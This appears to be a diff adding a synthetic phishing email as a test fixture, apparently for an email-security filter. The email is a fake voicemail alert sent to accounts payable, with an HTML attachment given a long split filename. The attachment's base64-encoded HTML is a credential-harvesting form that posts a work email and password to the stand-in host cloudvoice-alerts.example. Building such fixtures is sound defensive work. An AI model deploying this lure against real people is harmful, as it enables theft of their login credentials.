@@ -1,0 +1,42 @@
+Received: from mail.cloudvoice-alerts.example (mail.cloudvoice-alerts.example
+ [192.0.2.10]) by mx.example.net with ESMTPS id ho-attach-long-filename-html;
+ Fri, 09 Oct 2026 09:44:00 +0000
+From: Cloud Voice <voicemail@cloudvoice-alerts.example>
+To: ap@acme.example
+Subject: New voice message from 555-0137 (0:42)
+Date: Fri, 09 Oct 2026 09:44:00 +0000
+Message-ID: <ho-attach-long-filename-html.74dc704f4c@synthetic.acme.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="=_ecf_ho-attach-long-filename-html_0"
+
+--=_ecf_ho-attach-long-filename-html_0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+You have a new voice message.
+
+From: 555-0137
+Length: 0:42
+Received: Friday, October 9, 2026 9:42 AM
+
+Open the attached player to listen. The message will be removed after 48 hour=
+s.
+
+--=_ecf_ho-attach-long-filename-html_0
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename*0*=us-ascii''VM_Playback_from_555-0137_2026-10-09_0942_duration_00m;
+ filename*1*=42s_ref_A83F2D19C7_secure_audio_preview__.html
+MIME-Version: 1.0
+
+PGh0bWw+PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OkFyaWFsLHNhbnMtc2VyaWY7cGFkZGluZzoz
+MHB4Ij4KICA8aDM+Vm9pY2UgbWVzc2FnZSAoMDo0Mik8L2gzPgogIDxwPlNpZ24gaW4gd2l0aCB5
+b3VyIHdvcmsgZW1haWwgdG8gcGxheSB0aGlzIG1lc3NhZ2UuPC9wPgogIDxmb3JtIG1ldGhvZD0i
+cG9zdCIgYWN0aW9uPSJodHRwczovL2Nsb3Vkdm9pY2UtYWxlcnRzLmV4YW1wbGUvcGxheSI+CiAg
+ICA8aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9InUiIHBsYWNlaG9sZGVyPSJXb3JrIGVtYWlsIj48
+YnI+PGJyPgogICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIiBwbGFjZWhvbGRlcj0i
+UGFzc3dvcmQiPjxicj48YnI+CiAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+UGxheTwvYnV0dG9u
+PgogIDwvZm9ybT4KPC9ib2R5PjwvaHRtbD4K
+
+--=_ecf_ho-attach-long-filename-html_0--
